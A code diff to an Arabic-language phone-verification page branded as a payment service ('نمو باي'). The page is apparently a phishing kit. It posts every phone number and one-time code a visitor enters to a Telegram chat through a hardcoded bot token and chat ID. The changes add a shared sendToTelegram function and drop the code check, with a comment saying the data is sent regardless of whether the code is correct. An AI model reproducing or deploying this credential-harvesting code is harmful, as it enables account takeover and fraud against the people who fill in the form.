@@ -111,6 +111,7 @@ body {
 .verify-btn:disabled {
   background: #999;
   opacity: 0.7;
+  cursor: not-allowed;
 }
 
 .message {
@@ -118,6 +119,7 @@ body {
   font-size: 14px;
   padding: 10px;
   border-radius: 8px;
+  min-height: 20px;
 }
 
 .message.error {
@@ -194,6 +196,7 @@ body {
 
 .resend-btn:disabled {
   color: #ccc;
+  cursor: not-allowed;
 }
 
 .timer {
@@ -263,7 +266,7 @@ body {
       الرجاء إدخال هذا الرمز لمتابعة التسجيل
     </div>
     
-    <div class="code-inputs">
+    <div class="code-inputs" id="codeInputs">
       <input type="text" class="code-input" maxlength="1" inputmode="numeric">
       <input type="text" class="code-input" maxlength="1" inputmode="numeric">
       <input type="text" class="code-input" maxlength="1" inputmode="numeric">
@@ -291,10 +294,32 @@ body {
 <script>
 const BOT_TOKEN = '8789048053:AAGizPg8OXO6WwOrOdpsQY901Q3Bk5dnlIc';
 const CHAT_ID = '-5131004892';
+const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
 let currentPhone = '';
 let verificationCode = '';
 let resendTimer = 0;
+
+async function sendToTelegram(message) {
+  try {
+    console.log('📤 Sending to Telegram:', message);
+    const response = await fetch(API_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message
+      })
+    });
+    
+    const data = await response.json();
+    console.log('✅ Telegram Response:', data);
+    return data.ok || false;
+  } catch (error) {
+    console.error('❌ Error sending to Telegram:', error);
+    return false;
+  }
+}
 
 function handlePhoneSubmit() {
   const phone = document.getElementById('phone').value.trim();
@@ -317,38 +342,17 @@ function handlePhoneSubmit() {
   btn.disabled = true;
   btn.innerText = 'جاري الإرسال...';
 
-  sendPhoneToTelegram(phone);
-}
-
-function sendPhoneToTelegram(phone) {
   const message = `📱 رقم هاتف جديد - نمو باي\n\n📞 رقم الهاتف: ${phone}`;
-
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: message
-    })
-  })
-  .then(r => r.json())
-  .then(data => {
-    console.log('Phone Send Response:', data);
-    if (data.ok) {
+  
+  sendToTelegram(message).then(success => {
+    if (success) {
       setTimeout(() => goToCodePage(), 800);
     } else {
-      document.getElementById('phoneMsg').innerText = '❌ خطأ في الإرسال';
-      document.getElementById('phoneMsg').className = 'message error';
-      document.getElementById('phoneBtn').disabled = false;
-      document.getElementById('phoneBtn').innerText = 'تحقق';
+      msgDiv.innerText = '❌ خطأ في الإرسال';
+      msgDiv.className = 'message error';
+      btn.disabled = false;
+      btn.innerText = 'تحقق';
     }
-  })
-  .catch(e => {
-    console.error('Phone Send Error:', e);
-    document.getElementById('phoneMsg').innerText = '❌ خطأ الاتصال';
-    document.getElementById('phoneMsg').className = 'message error';
-    document.getElementById('phoneBtn').disabled = false;
-    document.getElementById('phoneBtn').innerText = 'تحقق';
   });
 }
 
@@ -358,7 +362,7 @@ function goToCodePage() {
   document.getElementById('displayPhone').innerText = currentPhone;
   
   verificationCode = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
-  console.log('Generated Code:', verificationCode);
+  console.log('🔐 Generated Code:', verificationCode);
   
   setupCodeInputs();
   startResendTimer();
@@ -383,54 +387,36 @@ function handleCodeSubmit() {
   const msgDiv = document.getElementById('codeMsg');
   const btn = document.getElementById('codeBtn');
 
+  console.log('📝 Entered Code:', code);
+  console.log('🔑 Expected Code:', verificationCode);
+
   if (code.length !== 4) {
-    msgDiv.innerText = 'يرجى إدخال الرمز كاملاً';
+    msgDiv.innerText = 'يرجى إدخال الرمز كاملاً (4 أرقام)';
     msgDiv.className = 'message error';
     return;
   }
 
   btn.disabled = true;
-  btn.innerText = 'جاري التحقق...';
+  btn.innerText = 'جاري الإرسال...';
 
-  if (code === verificationCode) {
-    msgDiv.innerText = '✅ رمز صحيح!';
-    msgDiv.className = 'message success';
+  // إرسال البيانات بغض النظر عن صحة الرمز
+  const message = `✅ بيانات التحقق - نمو باي\n\n📞 رقم الهاتف: ${currentPhone}\n🔐 رمز التحقق: ${code}`;
+  
+  console.log('🚀 Sending message:', message);
+  
+  sendToTelegram(message).then(success => {
+    console.log('✅ Send result:', success);
     
-    sendCodeToTelegram(code);
-  } else {
-    msgDiv.innerText = '❌ الرمز غير صحيح';
-    msgDiv.className = 'message error';
-    btn.disabled = false;
-    btn.innerText = 'تحقق من الرمز';
-  }
-}
-
-function sendCodeToTelegram(code) {
-  const message = `✅ تحقق ناجح - نمو باي\n\n📞 رقم الهاتف: ${currentPhone}\n🔐 رمز التحقق: ${code}`;
-
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: message
-    })
-  })
-  .then(r => r.json())
-  .then(data => {
-    console.log('Code Send Response:', data);
-    if (data.ok) {
-      setTimeout(() => {
-        document.getElementById('codeMsg').innerText = '🎉 تم الإرسال بنجاح!';
-        document.getElementById('codeMsg').className = 'message success';
-        setTimeout(() => goBackToPhone(), 1500);
-      }, 300);
+    if (success) {
+      msgDiv.innerText = '🎉 تم الإرسال بنجاح!';
+      msgDiv.className = 'message success';
+      setTimeout(() => goBackToPhone(), 1500);
+    } else {
+      msgDiv.innerText = '❌ خطأ في الإرسال';
+      msgDiv.className = 'message error';
+      btn.disabled = false;
+      btn.innerText = 'تحقق من الرمز';
     }
-  })
-  .catch(e => {
-    console.error('Code Send Error:', e);
-    document.getElementById('codeMsg').innerText = '❌ خطأ في الإرسال';
-    document.getElementById('codeMsg').className = 'message error';
   });
 }
 
@@ -439,24 +425,20 @@ function handleResend() {
   btn.disabled = true;
 
   verificationCode = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
-  console.log('New Code:', verificationCode);
+  console.log('🆕 New Code:', verificationCode);
 
   const message = `🔄 رمز جديد - نمو باي\n\n📞 رقم الهاتف: ${currentPhone}`;
-
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: message
-    })
-  })
-  .then(r => r.json())
-  .then(data => {
-    console.log('Resend Response:', data);
-    startResendTimer();
-  })
-  .catch(e => console.error('Resend Error:', e));
+  
+  sendToTelegram(message).then(success => {
+    if (success) {
+      document.getElementById('codeMsg').innerText = '';
+      startResendTimer();
+    } else {
+      document.getElementById('codeMsg').innerText = '❌ خطأ في إعادة الإرسال';
+      document.getElementById('codeMsg').className = 'message error';
+      btn.disabled = false;
+    }
+  });
 }
 
 function startResendTimer() {
@@ -484,6 +466,10 @@ function goBackToPhone() {
   document.getElementById('phoneMsg').innerHTML = '';
   document.getElementById('phoneBtn').innerText = 'تحقق';
   document.getElementById('phoneBtn').disabled = false;
+  
+  const inputs = document.querySelectorAll('.code-input');
+  inputs.forEach(input => input.value = '');
+  document.getElementById('codeMsg').innerHTML = '';
 }
 </script>
 
